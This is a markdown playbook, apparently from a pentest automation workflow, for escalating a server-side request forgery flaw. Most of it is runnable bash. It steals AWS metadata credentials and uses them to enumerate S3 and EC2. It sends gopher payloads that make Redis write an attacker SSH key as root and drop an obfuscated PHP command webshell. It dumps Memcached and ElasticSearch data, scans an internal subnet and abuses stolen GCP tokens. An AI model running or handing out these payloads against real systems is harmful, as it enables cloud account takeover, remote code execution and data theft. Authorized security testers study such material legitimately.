# SSRF — Impact Escalation

## Purpose
Maximize SSRF severity by pivoting from URL fetching to cloud account takeover, internal service exploitation, credential theft, and remote code execution via service-specific attacks (Redis RCE, Docker escape, etc.).

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — confirmed SSRF parameter
- `$OUTDIR` — output root

## Commands

### E1 — AWS Account Takeover via IMDSv1 Credentials

```bash
# Using extracted IAM credentials, configure AWS CLI
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" > "$OUTDIR/ssrf/role_name.txt"
ROLE=$(tr -d '\n' < "$OUTDIR/ssrf/role_name.txt")
curl -s "$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" > "$OUTDIR/ssrf/creds.json"

# Extract credentials
ACCESS_KEY=$(jq -r '.AccessKeyId' "$OUTDIR/ssrf/creds.json")
SECRET_KEY=$(jq -r '.SecretAccessKey' "$OUTDIR/ssrf/creds.json")
SESSION_TOKEN=$(jq -r '.Token' "$OUTDIR/ssrf/creds.json")

export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$SESSION_TOKEN"

# Verify access
aws sts get-caller-identity 2>&1 | tee "$OUTDIR/ssrf/aws_whoami.txt"
[ $? -eq 0 ] && echo "[CRITICAL] AWS account access confirmed via SSRF → IAM credential theft"

# Enumerate S3 buckets
aws s3 ls 2>&1 | tee "$OUTDIR/ssrf/aws_s3_list.txt"

# Enumerate EC2 instances
aws ec2 describe-instances --max-items 5 2>&1 | tee "$OUTDIR/ssrf/aws_ec2_list.txt"
```

### E2 — Redis RCE via SSRF (gopher protocol)

```bash
# Step 1: Check current dir/dbfilename config
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0D%0AQUIT%0D%0A" > "$OUTDIR/ssrf/redis_config_dir.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20GET%20dbfilename%0D%0AQUIT%0D%0A" > "$OUTDIR/ssrf/redis_config_dbfilename.txt"

# Step 2: Write SSH key via Redis (if Redis runs as root)
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EA...ATTACKER_PUBLIC_KEY"
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F.ssh%2F%0D%0AQUIT%0D%0A" > /dev/null
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20authorized_keys%0D%0AQUIT%0D%0A" > /dev/null
KEY_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\n\n${SSH_KEY}\n\n'))")
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_SET%20ssrf_shell%20${KEY_ENC}%0D%0AQUIT%0D%0A" > /dev/null
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_SAVE%0D%0AQUIT%0D%0A" > /dev/null
echo "[*] SSH key write attempted via Redis SSRF"

# Step 3: Webshell via Redis (if webroot known)
WS="\\x3c\\x3f\\x70\\x68\\x70\\x20\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x24\\x5f\\x47\\x45\\x54\\x5b\\x27\\x63\\x6d\\x64\\x27\\x5d\\x29\\x3b\\x20\\x3f\\x3e"
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0D%0AQUIT%0D%0A" > /dev/null
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php%0D%0AQUIT%0D%0A" > /dev/null
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_SET%20ws%20${WS}%0D%0AQUIT%0D%0A" > /dev/null
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_SAVE%0D%0AQUIT%0D%0A" > /dev/null
```

### E3 — Memcached Data Exfiltration

```bash
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:11211/_stats%20items%0D%0A" > "$OUTDIR/ssrf/memcached_stats_items.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:11211/_stats%20cachedump%201%20100%0D%0A" > "$OUTDIR/ssrf/memcached_cachedump.txt"
```

### E4 — ElasticSearch Data Access

```bash
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:9200/_search?pretty" > "$OUTDIR/ssrf/es_all_data.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:9200/_cat/indices?v" > "$OUTDIR/ssrf/es_indices.txt"
curl -s "$TARGET_URL?${VULN_PARAM}=http://127.0.0.1:9200/_nodes" > "$OUTDIR/ssrf/es_nodes.txt"
```

### E5 — Internal Service Scanning (Full Subnet)

```bash
# Create subnet wordlist
python3 -c "for i in range(1,255): print(f'10.0.0.{i}')" > "$OUTDIR/ssrf/subnet_10_0_0.txt"

while read -r ip; do
  curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL?${VULN_PARAM}=http://${ip}:80/" >> "$OUTDIR/ssrf/subnet_scan_80.txt" &
  [ $(jobs -r | wc -l) -ge 10 ] && wait
done < "$OUTDIR/ssrf/subnet_10_0_0.txt"
wait
grep -v '000\|404\|502\|503' "$OUTDIR/ssrf/subnet_scan_80.txt" | tee "$OUTDIR/ssrf/subnet_live_hosts.txt"
```

### E6 — GCP Token Exploitation

```bash
GCP_TOKEN=$(jq -r '.access_token' "$OUTDIR/ssrf/gcp_token.json" 2>/dev/null)

if [ -n "$GCP_TOKEN" ] && [ "$GCP_TOKEN" != "null" ]; then
  # Verify token validity
  curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$GCP_TOKEN" | tee "$OUTDIR/ssrf/gcp_tokeninfo.json"

  # Enumerate GCS buckets
  curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$(jq -r '.project_id' "$OUTDIR/ssrf/gcp_project_id.txt")" | tee "$OUTDIR/ssrf/gcp_buckets.json"

  echo "[CRITICAL] GCP access token valid — cloud account compromise via SSRF"
fi
```

### E7 — Severity Classification

```bash
cat > "$OUTDIR/ssrf/severity_rating.md" << 'SEVEOF'
| Condition | Technique | Severity |
|---|---|---|
| Cloud metadata credentials extracted | IMDS/metadata endpoint access | Critical |
| AWS IAM credentials used for account access | SSRF → AWS takeover | Critical |
| Redis command execution (SSH/web shell) | SSRF → gopher → Redis RCE | Critical |
| file:// reads /etc/passwd or .env | SSRF → file protocol | High |
| Internal service data exfil (ES, Memcached) | SSRF → internal network | High |
| Docker socket access (container escape) | SSRF → unix socket | Critical |
| K8s secrets accessed | SSRF → Kubernetes API | Critical |
| Blind SSRF with OOB confirmation only | DNS/HTTP callback | Medium |
| URL parser bypass needed | IP representation / DNS rebinding | +1 severity |
SEVEOF
```

## Detection Signals
- `aws sts get-caller-identity` succeeds → cloud account takeover
- Redis keys enumerated or config read → Redis access confirmed
- `es_all_data.txt` contains document data → ElasticSearch data accessed
- `subnet_live_hosts.txt` > 0 → internal network mapped
- GCP token validates successfully → GCP service account compromise

## False Positives
- AWS credentials extracted but already expired — IAM creds have ~1-6h lifetime; re-extract if needed
- Redis gopher commands return `ERR unknown command` — Redis may have ACL or protected mode
- Docker socket returns 400 — socket may be there but not accessible via HTTP unix:// scheme
- Subnet scan timeouts — internal firewalls may block ICMP/connection; timing-based detection needed

## Next
├── If cloud takeover achieved → go to `05-evidence-collection.md` immediately (Critical)
├── If Redis/ES/internal service exploited → go to `05-evidence-collection.md`
├── If blind SSRF only → document OOB confirmation as proof
└── Always → capture all impact exploitation output for evidence